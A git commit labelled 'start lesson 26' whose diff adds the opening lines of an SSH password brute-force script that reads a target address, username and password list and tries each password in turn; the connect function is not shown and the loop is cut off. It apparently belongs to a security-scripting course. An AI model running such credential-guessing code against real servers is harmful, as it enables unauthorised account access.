2886c8f6479a1a8f1f753e7c754880c1513e1e7b
Chris <stofferdyr@gmail.com>
2022-02-09 05:39:19 -0500

    start lesson 26

--- sshbruteforce/sshbrute.py
+++ sshbruteforce/sshbrute.py
@@ -1,1 +1,15 @@
 import paramiko, sys, os, socket, termcolor
+
+host = input('[+] Target address: ')
+username = input('[+] SSH username: ')
+input_file = input('[+] Password file: ')
+
+if not os.path.exists(input_file):
+    print('[!!] That file/path doesnt exist')
+    sys.exit(1)
+
+with open(input_file, 'r') as file:
+    for line in file.readlines():
+        password = line.strip()
+        try:
+            ssh_connect(password)
